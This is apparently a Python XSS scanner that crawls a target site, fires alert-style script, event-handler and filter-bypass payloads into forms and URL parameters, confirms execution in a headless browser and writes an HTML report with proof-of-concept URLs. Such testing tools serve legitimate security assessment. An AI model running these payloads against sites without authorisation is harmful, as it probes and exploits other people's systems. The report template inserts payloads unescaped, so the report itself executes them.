#!/usr/bin/env python3
"""
Final XSS Scanner - Complete Professional Solution
Phase 1: Ultra-fast reconnaissance with requests
Phase 2: Real browser validation with screenshots
Author: AI Assistant
Version: 4.0 Final
"""

import requests
import re
import urllib.parse
import time
import json
import threading
import os
from urllib.parse import urljoin, urlparse, parse_qs, urlunparse
from bs4 import BeautifulSoup
import argparse
from colorama import init, Fore, Style
from concurrent.futures import ThreadPoolExecutor, as_completed
import datetime
import hashlib

# Try to import Playwright
try:
    from playwright.sync_api import sync_playwright
    PLAYWRIGHT_AVAILABLE = True
except ImportError:
    PLAYWRIGHT_AVAILABLE = False

# Initialize colorama
init()

class FinalXSSScanner:
    def __init__(self, target_url, max_threads=10, delay=0.2, max_depth=2, timeout=8):
        self.target_url = target_url
        self.max_threads = max_threads
        self.delay = delay
        self.max_depth = max_depth
        self.timeout = timeout
        
        # Session configuration
        self.session = requests.Session()
        self.session.headers.update({
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36'
        })
        
        # Data structures
        self.visited_urls = set()
        self.confirmed_vulnerabilities = []
        self.lock = threading.Lock()
        
        # Browser for validation
        self.browser = None
        self.context = None
        
        # Optimized payloads
        self.payloads = self._load_smart_payloads()
        
        # Create directories
        self.create_directories()
        
    def create_directories(self):
        """Create necessary directories"""
        os.makedirs('screenshots', exist_ok=True)
        os.makedirs('reports', exist_ok=True)
    
    def log(self, message, level="INFO"):
        """Enhanced logging"""
        colors = {
            "INFO": Fore.CYAN,
            "SUCCESS": Fore.GREEN,
            "WARNING": Fore.YELLOW,
            "ERROR": Fore.RED,
            "VULN": Fore.MAGENTA,
            "PHASE": Fore.CYAN + Style.BRIGHT
        }
        timestamp = datetime.datetime.now().strftime("%H:%M:%S")
        print(f"{colors.get(level, Fore.WHITE)}[{timestamp}] [{level}] {message}{Style.RESET_ALL}")
    
    def _load_smart_payloads(self):
        """Load smart XSS payloads"""
        return [
            # Basic payloads
            '<script>alert("XSS_CONFIRMED")</script>',
            '<img src=x onerror=alert("XSS_CONFIRMED")>',
            '<svg onload=alert("XSS_CONFIRMED")>',
            '<iframe src="javascript:alert(\'XSS_CONFIRMED\')">',
            '<body onload=alert("XSS_CONFIRMED")>',
            
            # Alternative JavaScript functions
            '<script>prompt("XSS_CONFIRMED")</script>',
            '<script>confirm("XSS_CONFIRMED")</script>',
            '<img src=x onerror=prompt("XSS_CONFIRMED")>',
            
            # Attribute-based payloads
            '" onmouseover="alert(\'XSS_CONFIRMED\')" x="',
            "' onmouseover='alert(\"XSS_CONFIRMED\")' x='",
            '" onfocus="alert(\'XSS_CONFIRMED\')" autofocus="',
            "' onfocus='alert(\"XSS_CONFIRMED\")' autofocus='",
            
            # Filter bypass payloads
            '<ScRiPt>alert("XSS_CONFIRMED")</ScRiPt>',
            '<script>alert(String.fromCharCode(88,83,83,95,67,79,78,70,73,82,77,69,68))</script>',
            '<img src=x onerror=alert(String.fromCharCode(88,83,83,95,67,79,78,70,73,82,77,69,68))>'
        ]
    
    def phase1_ultra_fast_reconnaissance(self):
        """Phase 1: Ultra-fast reconnaissance"""
        self.log("=" * 70, "PHASE")
        self.log("PHASE 1: ULTRA-FAST RECONNAISSANCE", "PHASE")
        self.log("=" * 70, "PHASE")
        
        try:
            # Test target
            response = self.session.get(self.target_url, timeout=self.timeout)
            response.raise_for_status()
            self.log(f"Target accessible (Status: {response.status_code})", "SUCCESS")
            
            # Ultra-fast crawling
            discovered_urls = self._ultra_fast_crawl()
            self.log(f"Discovered {len(discovered_urls)} URLs", "SUCCESS")
            
            # Extract forms with threading
            forms = self._extract_forms_ultra_fast(discovered_urls)
            self.log(f"Found {len(forms)} forms", "SUCCESS")
            
            return {
                'urls': discovered_urls,
                'forms': forms
            }
            
        except Exception as e:
            self.log(f"Phase 1 failed: {str(e)}", "ERROR")
            return None
    
    def _ultra_fast_crawl(self):
        """Ultra-fast crawling"""
        urls_to_visit = [(self.target_url, 0)]
        discovered_urls = set()
        base_domain = urlparse(self.target_url).netloc
        
        while urls_to_visit:
            current_url, depth = urls_to_visit.pop(0)
            
            if (current_url in self.visited_urls or 
                depth > self.max_depth or 
                current_url in discovered_urls):
                continue
            
            self.visited_urls.add(current_url)
            discovered_urls.add(current_url)
            
            try:
                response = self.session.get(current_url, timeout=3)
                response.raise_for_status()
                
                # Extract links
                links = self._extract_links_fast(response.text, current_url)
                
                # Add same-origin links
                for link in links:
                    parsed = urlparse(link)
                    if (parsed.scheme in ('http', 'https') and 
                        parsed.netloc == base_domain and
                        link not in discovered_urls and
                        not self._is_static_resource(link)):
                        urls_to_visit.append((link, depth + 1))
                
                time.sleep(0.05)  # Minimal delay
                
            except Exception:
                continue
        
        return list(discovered_urls)
    
    def _extract_links_fast(self, html_content, base_url):
        """Fast link extraction"""
        links = []
        # Use regex for faster extraction
        link_pattern = r'<a[^>]+href=["\']([^"\']+)["\'][^>]*>'
        matches = re.findall(link_pattern, html_content, re.IGNORECASE)
        
        for href in matches:
            full_url = urljoin(base_url, href)
            links.append(full_url)
        
        return links
    
    def _is_static_resource(self, url):
        """Check if URL is static resource"""
        static_extensions = ['.css', '.js', '.png', '.jpg', '.jpeg', '.gif', '.ico', '.svg', '.pdf', '.woff', '.woff2']
        return any(url.lower().endswith(ext) for ext in static_extensions)
    
    def _extract_forms_ultra_fast(self, urls):
        """Ultra-fast form extraction with threading"""
        all_forms = []
        
        def extract_forms_from_url(url):
            try:
                response = self.session.get(url, timeout=3)
                response.raise_for_status()
                
                forms = []
                # Use regex for faster form extraction
                form_pattern = r'<form[^>]*>(.*?)</form>'
                form_matches = re.findall(form_pattern, response.text, re.IGNORECASE | re.DOTALL)
                
                for form_html in form_matches:
                    form_data = {
                        'url': url,
                        'action': self._extract_action(form_html, url),
                        'method': self._extract_method(form_html),
                        'inputs': self._extract_inputs_fast(form_html)
                    }
                    forms.append(form_data)
                
                return forms
                
            except Exception:
                return []
        
        with ThreadPoolExecutor(max_workers=self.max_threads) as executor:
            futures = [executor.submit(extract_forms_from_url, url) for url in urls]
            
            for future in as_completed(futures):
                try:
                    forms = future.result()
                    all_forms.extend(forms)
                except Exception:
                    continue
        
        return all_forms
    
    def _extract_action(self, form_html, base_url):
        """Extract form action"""
        action_match = re.search(r'action=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        if action_match:
            action = action_match.group(1)
            return urljoin(base_url, action)
        return base_url
    
    def _extract_method(self, form_html):
        """Extract form method"""
        method_match = re.search(r'method=["\']([^"\']*)["\']', form_html, re.IGNORECASE)
        if method_match:
            return method_match.group(1).upper()
        return 'GET'
    
    def _extract_inputs_fast(self, form_html):
        """Fast input extraction"""
        inputs = []
        
        # Extract input tags
        input_pattern = r'<input[^>]*name=["\']([^"\']*)["\'][^>]*>'
        input_matches = re.findall(input_pattern, form_html, re.IGNORECASE)
        
        for name in input_matches:
            input_data = {
                'name': name,
                'type': 'text',
                'value': ''
            }
            inputs.append(input_data)
        
        # Extract textarea tags
        textarea_pattern = r'<textarea[^>]*name=["\']([^"\']*)["\'][^>]*>'
        textarea_matches = re.findall(textarea_pattern, form_html, re.IGNORECASE)
        
        for name in textarea_matches:
            input_data = {
                'name': name,
                'type': 'textarea',
                'value': ''
            }
            inputs.append(input_data)
        
        return inputs
    
    def phase2_smart_xss_validation(self, recon_data):
        """Phase 2: Smart XSS validation"""
        self.log("=" * 70, "PHASE")
        self.log("PHASE 2: SMART XSS VALIDATION", "PHASE")
        self.log("=" * 70, "PHASE")
        
        if not PLAYWRIGHT_AVAILABLE:
            self.log("Playwright not available, using smart string matching", "WARNING")
            self._smart_string_matching(recon_data)
            return
        
        if not self._init_browser():
            self.log("Browser init failed, using smart string matching", "WARNING")
            self._smart_string_matching(recon_data)
            return
        
        try:
            # Test forms first (higher success rate)
            for form in recon_data['forms']:
                if self._test_form_smart(form):
                    continue  # Found XSS, move to next form
            
            # Test URL parameters
            for url in recon_data['urls']:
                params = self._extract_parameters(url)
                for param_name in params:
                    if self._test_parameter_smart(url, param_name):
                        continue  # Found XSS, move to next parameter
            
            self._close_browser()
            
        except Exception as e:
            self.log(f"Phase 2 failed: {str(e)}", "ERROR")
            self._close_browser()
    
    def _extract_parameters(self, url):
        """Extract parameters from URL"""
        parsed_url = urlparse(url)
        params = parse_qs(parsed_url.query)
        return params
    
    def _init_browser(self):
        """Initialize browser"""
        try:
            playwright = sync_playwright().start()
            self.browser = playwright.chromium.launch(
                headless=True, 
                args=['--no-sandbox', '--disable-setuid-sandbox', '--disable-dev-shm-usage']
            )
            self.context = self.browser.new_context()
            return True
        except Exception as e:
            self.log(f"Browser init error: {str(e)}", "ERROR")
            return False
    
    def _close_browser(self):
        """Close browser"""
        try:
            if self.context:
                self.context.close()
            if self.browser:
                self.browser.close()
        except Exception:
            pass
    
    def _test_form_smart(self, form):
        """Smart form testing"""
        for input_field in form['inputs']:
            if input_field['name']:
                # Test with most effective payloads first
                for payload in self.payloads[:5]:  # Test top 5 payloads
                    try:
                        # Prepare form data
                        form_data = {}
                        for field in form['inputs']:
                            if field['name'] == input_field['name']:
                                form_data[field['name']] = payload
                            else:
                                form_data[field['name']] = field['value']
                        
                        # Test with browser
                        if self._validate_xss_browser(form['action'], form_data, payload, input_field['name']):
                            return True
                        
                        time.sleep(self.delay)
                        
                    except Exception:
                        continue
        return False
    
    def _test_parameter_smart(self, url, param_name):
        """Smart parameter testing"""
        # Test with most effective payloads first
        for payload in self.payloads[:5]:  # Test top 5 payloads
            try:
                test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                
                if self._validate_xss_browser(test_url, None, payload, param_name):
                    return True
                
                time.sleep(self.delay)
                
            except Exception:
                continue
        return False
    
    def _validate_xss_browser(self, url, form_data, payload, param_name):
        """Validate XSS with browser"""
        try:
            page = self.context.new_page()
            
            # Set up alert handler
            alert_dialog = None
            def handle_dialog(dialog):
                nonlocal alert_dialog
                alert_dialog = dialog
                dialog.accept()
            
            page.on("dialog", handle_dialog)
            
            if form_data:
                # Form submission
                page.goto(url, wait_until="networkidle", timeout=8000)
                
                # Fill form
                for field_name, field_value in form_data.items():
                    try:
                        page.fill(f'input[name="{field_name}"], textarea[name="{field_name}"]', field_value)
                    except:
                        pass
                
                # Submit
                page.click('input[type="submit"], button[type="submit"]')
                page.wait_for_load_state("networkidle", timeout=8000)
            else:
                # Direct URL
                page.goto(url, wait_until="networkidle", timeout=8000)
            
            # Wait for potential XSS
            time.sleep(1.5)
            
            # Check if alert was triggered
            if alert_dialog:
                # Take screenshot
                screenshot_path = self._take_screenshot(page, param_name, payload)
                
                # Add to confirmed vulnerabilities
                with self.lock:
                    vuln = {
                        'url': url,
                        'parameter': param_name,
                        'payload': payload,
                        'screenshot': screenshot_path,
                        'timestamp': datetime.datetime.now().isoformat(),
                        'alert_message': alert_dialog.message
                    }
                    self.confirmed_vulnerabilities.append(vuln)
                    self.log(f"CONFIRMED XSS! Parameter: {param_name}", "VULN")
                    self.log(f"Payload: {payload}", "VULN")
                    if screenshot_path:
                        self.log(f"Screenshot: {screenshot_path}", "VULN")
                
                page.close()
                return True
            
            page.close()
            return False
            
        except Exception as e:
            self.log(f"Browser validation error: {str(e)}", "ERROR")
            try:
                page.close()
            except:
                pass
            return False
    
    def _take_screenshot(self, page, param_name, payload):
        """Take screenshot"""
        try:
            timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
            safe_param = re.sub(r'[^\w\-_]', '_', param_name)
            safe_payload = re.sub(r'[^\w\-_]', '_', payload[:10])
            
            filename = f"xss_{safe_param}_{safe_payload}_{timestamp}.png"
            screenshot_path = os.path.join('screenshots', filename)
            
            page.screenshot(path=screenshot_path, full_page=True)
            return screenshot_path
            
        except Exception as e:
            self.log(f"Screenshot error: {str(e)}", "ERROR")
            return None
    
    def _smart_string_matching(self, recon_data):
        """Smart string matching validation"""
        self.log("Using smart string matching validation", "INFO")
        
        # Test forms
        for form in recon_data['forms']:
            for input_field in form['inputs']:
                if input_field['name']:
                    for payload in self.payloads[:5]:  # Test top 5 payloads
                        try:
                            # Prepare form data
                            form_data = {}
                            for field in form['inputs']:
                                if field['name'] == input_field['name']:
                                    form_data[field['name']] = payload
                                else:
                                    form_data[field['name']] = field['value']
                            
                            # Test with requests
                            if form['method'] == 'POST':
                                response = self.session.post(form['action'], data=form_data, timeout=self.timeout)
                            else:
                                response = self.session.get(form['action'], params=form_data, timeout=self.timeout)
                            
                            # Check for XSS indicators
                            if self._check_xss_indicators_smart(response.text, payload):
                                with self.lock:
                                    vuln = {
                                        'url': form['action'],
                                        'parameter': input_field['name'],
                                        'payload': payload,
                                        'screenshot': None,
                                        'timestamp': datetime.datetime.now().isoformat(),
                                        'alert_message': 'Smart string matching detection'
                                    }
                                    self.confirmed_vulnerabilities.append(vuln)
                                    self.log(f"POTENTIAL XSS! Parameter: {input_field['name']}", "VULN")
                                    self.log(f"Payload: {payload}", "VULN")
                                
                                break  # Found XSS for this parameter
                            
                            time.sleep(self.delay)
                            
                        except Exception:
                            continue
        
        # Test URL parameters
        for url in recon_data['urls']:
            params = self._extract_parameters(url)
            for param_name in params:
                for payload in self.payloads[:5]:  # Test top 5 payloads
                    try:
                        test_url = f"{url}?{param_name}={urllib.parse.quote(payload)}"
                        response = self.session.get(test_url, timeout=self.timeout)
                        
                        if self._check_xss_indicators_smart(response.text, payload):
                            with self.lock:
                                vuln = {
                                    'url': url,
                                    'parameter': param_name,
                                    'payload': payload,
                                    'screenshot': None,
                                    'timestamp': datetime.datetime.now().isoformat(),
                                    'alert_message': 'Smart string matching detection'
                                }
                                self.confirmed_vulnerabilities.append(vuln)
                                self.log(f"POTENTIAL XSS! Parameter: {param_name}", "VULN")
                                self.log(f"Payload: {payload}", "VULN")
                            
                            break  # Found XSS for this parameter
                        
                        time.sleep(self.delay)
                        
                    except Exception:
                        continue
    
    def _check_xss_indicators_smart(self, response_text, payload):
        """Smart XSS indicator checking"""
        # Check if payload is reflected
        if payload in response_text:
            # Check for execution indicators
            execution_indicators = [
                'alert(',
                'prompt(',
                'confirm(',
                '<script>',
                'onerror=',
                'onload=',
                'onclick=',
                'onmouseover=',
                'onfocus='
            ]
            
            for indicator in execution_indicators:
                if indicator in response_text:
                    return True
        
        return False
    
    def generate_professional_report(self):
        """Generate professional HTML report"""
        self.log("Generating professional HTML report...", "INFO")
        
        timestamp = datetime.datetime.now().strftime("%Y%m%d_%H%M%S")
        report_path = os.path.join('reports', f'xss_report_{timestamp}.html')
        
        html_content = f"""
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>XSS Scanner Report - {self.target_url}</title>
    <style>
        * {{ margin: 0; padding: 0; box-sizing: border-box; }}
        body {{ 
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; 
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }}
        .container {{ 
            max-width: 1200px; 
            margin: 0 auto; 
            background: white; 
            border-radius: 15px; 
            box-shadow: 0 20px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }}
        .header {{ 
            background: linear-gradient(135deg, #e74c3c 0%, #c0392b 100%);
            color: white;
            text-align: center; 
            padding: 40px 20px;
        }}
        .header h1 {{ 
            font-size: 2.5em; 
            margin-bottom: 10px;
            text-shadow: 2px 2px 4px rgba(0,0,0,0.3);
        }}
        .header p {{ 
            font-size: 1.1em; 
            opacity: 0.9;
        }}
        .summary {{ 
            background: #f8f9fa; 
            padding: 30px; 
            border-bottom: 3px solid #e74c3c;
        }}
        .stats {{ 
            display: grid; 
            grid-template-columns: repeat(auto-fit, minmax(200px, 1fr)); 
            gap: 20px; 
            margin: 20px 0; 
        }}
        .stat-card {{ 
            background: white; 
            padding: 25px; 
            border-radius: 10px; 
            text-align: center; 
            border-left: 5px solid #e74c3c;
            box-shadow: 0 5px 15px rgba(0,0,0,0.1);
            transition: transform 0.3s ease;
        }}
        .stat-card:hover {{ transform: translateY(-5px); }}
        .stat-number {{ 
            font-size: 2.5em; 
            font-weight: bold; 
            color: #e74c3c; 
            margin-bottom: 5px;
        }}
        .stat-label {{ 
            color: #666; 
            font-weight: 500;
        }}
        .vulnerabilities {{ padding: 30px; }}
        .vulnerability {{ 
            background: linear-gradient(135deg, #fff5f5 0%, #fef2f2 100%);
            border: 2px solid #fecaca; 
            border-radius: 15px; 
            padding: 25px; 
            margin: 25px 0;
            box-shadow: 0 10px 25px rgba(0,0,0,0.1);
            transition: transform 0.3s ease;
        }}
        .vulnerability:hover {{ transform: translateY(-3px); }}
        .vulnerability h3 {{ 
            color: #dc2626; 
            margin-bottom: 15px;
            font-size: 1.4em;
            border-bottom: 2px solid #fecaca;
            padding-bottom: 10px;
        }}
        .vuln-details {{ 
            background: white; 
            padding: 20px; 
            border-radius: 10px; 
            margin: 15px 0;
            border-left: 4px solid #e74c3c;
        }}
        .vuln-details strong {{ 
            color: #333; 
            display: inline-block;
            min-width: 100px;
        }}
        .screenshot {{ 
            max-width: 100%; 
            border: 3px solid #ddd; 
            border-radius: 10px;
            margin: 15px 0;
            box-shadow: 0 5px 15px rgba(0,0,0,0.2);
        }}
        .poc {{ 
            background: #1a1a1a; 
            color: #00ff00;
            padding: 15px; 
            border-radius: 8px; 
            font-family: 'Courier New', monospace; 
            word-break: break-all;
            border: 1px solid #333;
            margin: 10px 0;
        }}
        .no-vulns {{ 
            text-align: center; 
            color: #28a745; 
            font-size: 1.3em; 
            padding: 60px 20px;
            background: linear-gradient(135deg, #d4edda 0%, #c3e6cb 100%);
            border-radius: 15px;
            border: 2px solid #28a745;
        }}
        .footer {{ 
            background: #2c3e50; 
            color: white;
            text-align: center; 
            padding: 30px;
            margin-top: 40px;
        }}
        .severity-critical {{ 
            border-left: 5px solid #dc3545 !important;
            background: linear-gradient(135deg, #fff5f5 0%, #fed7d7 100%) !important;
        }}
        .severity-high {{ 
            border-left: 5px solid #fd7e14 !important;
            background: linear-gradient(135deg, #fff8f0 0%, #fed7aa 100%) !important;
        }}
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>🔒 XSS Scanner Report</h1>
            <p>Target: {self.target_url}</p>
            <p>Generated: {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
        
        <div class="summary">
            <h2 style="color: #333; margin-bottom: 20px; font-size: 1.8em;">📊 Scan Summary</h2>
            <div class="stats">
                <div class="stat-card">
                    <div class="stat-number">{len(self.confirmed_vulnerabilities)}</div>
                    <div class="stat-label">Confirmed XSS</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{len(self.visited_urls)}</div>
                    <div class="stat-label">URLs Scanned</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{len(self.payloads)}</div>
                    <div class="stat-label">Payloads Tested</div>
                </div>
                <div class="stat-card">
                    <div class="stat-number">{self.max_threads}</div>
                    <div class="stat-label">Threads Used</div>
                </div>
            </div>
        </div>
        
        <div class="vulnerabilities">
            <h2 style="color: #333; margin-bottom: 25px; font-size: 1.8em;">🎯 XSS Vulnerabilities</h2>
"""
        
        if not self.confirmed_vulnerabilities:
            html_content += '''
            <div class="no-vulns">
                <h3>✅ No XSS vulnerabilities found</h3>
                <p>Target appears to be secure against XSS attacks</p>
            </div>'''
        else:
            for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
                severity_class = "severity-critical" if "alert" in vuln['payload'].lower() else "severity-high"
                
                html_content += f"""
                <div class="vulnerability {severity_class}">
                    <h3>🚨 Vulnerability #{i}</h3>
                    <div class="vuln-details">
                        <p><strong>URL:</strong> {vuln['url']}</p>
                        <p><strong>Parameter:</strong> {vuln['parameter']}</p>
                        <p><strong>Payload:</strong> {vuln['payload']}</p>
                        <p><strong>Alert Message:</strong> {vuln.get('alert_message', 'N/A')}</p>
                        <p><strong>Timestamp:</strong> {vuln['timestamp']}</p>
                    </div>
                    
                    <strong>POC URL:</strong>
                    <div class="poc">{vuln['url']}?{vuln['parameter']}={urllib.parse.quote(vuln['payload'])}</div>
                    
                    {f'<img src="../{vuln["screenshot"]}" alt="XSS Screenshot" class="screenshot">' if vuln.get('screenshot') else ''}
                </div>
"""
        
        html_content += f"""
        </div>
        
        <div class="footer">
            <h3>🔒 Final XSS Scanner v4.0</h3>
            <p>Professional XSS vulnerability assessment tool</p>
            <p>Only browser-confirmed XSS vulnerabilities with screenshots are reported</p>
            <p>Generated on {datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
        </div>
    </div>
</body>
</html>
"""
        
        try:
            with open(report_path, 'w', encoding='utf-8') as f:
                f.write(html_content)
            
            self.log(f"Professional HTML report generated: {report_path}", "SUCCESS")
            return report_path
            
        except Exception as e:
            self.log(f"Error generating report: {str(e)}", "ERROR")
            return None
    
    def scan(self):
        """Main scanning method"""
        start_time = time.time()
        
        self.log("🚀 Starting Final XSS Scanner v4.0", "SUCCESS")
        self.log(f"Target: {self.target_url}", "INFO")
        
        try:
            # Phase 1: Ultra-fast reconnaissance
            recon_data = self.phase1_ultra_fast_reconnaissance()
            if not recon_data:
                self.log("Phase 1 failed, aborting scan", "ERROR")
                return
            
            # Phase 2: Smart XSS validation
            self.phase2_smart_xss_validation(recon_data)
            
            # Generate professional report
            report_path = self.generate_professional_report()
            
            # Show final results
            self._show_final_results(report_path)
            
            elapsed_time = time.time() - start_time
            self.log(f"Scan completed in {elapsed_time:.2f} seconds", "SUCCESS")
            
        except Exception as e:
            self.log(f"Scan failed: {str(e)}", "ERROR")
    
    def _show_final_results(self, report_path):
        """Show final scan results"""
        self.log("=" * 70, "PHASE")
        self.log("FINAL SCAN RESULTS", "PHASE")
        self.log("=" * 70, "PHASE")
        
        self.log(f"Total confirmed XSS vulnerabilities: {len(self.confirmed_vulnerabilities)}", "SUCCESS")
        
        if self.confirmed_vulnerabilities:
            self.log("\n🎯 CONFIRMED XSS VULNERABILITIES:", "VULN")
            for i, vuln in enumerate(self.confirmed_vulnerabilities, 1):
                self.log(f"\n--- Vulnerability #{i} ---", "VULN")
                self.log(f"URL: {vuln['url']}", "VULN")
                self.log(f"Parameter: {vuln['parameter']}", "VULN")
                self.log(f"Payload: {vuln['payload']}", "VULN")
                if vuln.get('screenshot'):
                    self.log(f"Screenshot: {vuln['screenshot']}", "VULN")
                self.log(f"Alert: {vuln.get('alert_message', 'N/A')}", "VULN")
        else:
            self.log("\n✅ No XSS vulnerabilities found", "SUCCESS")
        
        if report_path:
            self.log(f"\n📄 Professional HTML Report: {report_path}", "SUCCESS")
        
        self.log("\n🔒 Only browser-confirmed XSS with screenshots are reported", "SUCCESS")

def main():
    parser = argparse.ArgumentParser(description='Final XSS Scanner v4.0 - Professional Solution')
    parser.add_argument('url', help='Target URL to scan')
    parser.add_argument('-t', '--threads', type=int, default=10, help='Number of threads (default: 10)')
    parser.add_argument('-d', '--delay', type=float, default=0.2, help='Delay between requests (default: 0.2)')
    parser.add_argument('--depth', type=int, default=2, help='Crawling depth (default: 2)')
    parser.add_argument('--timeout', type=int, default=8, help='Request timeout (default: 8)')
    
    args = parser.parse_args()
    
    scanner = FinalXSSScanner(
        args.url,
        args.threads,
        args.delay,
        args.depth,
        args.timeout
    )
    
    scanner.scan()

if __name__ == "__main__":
    main()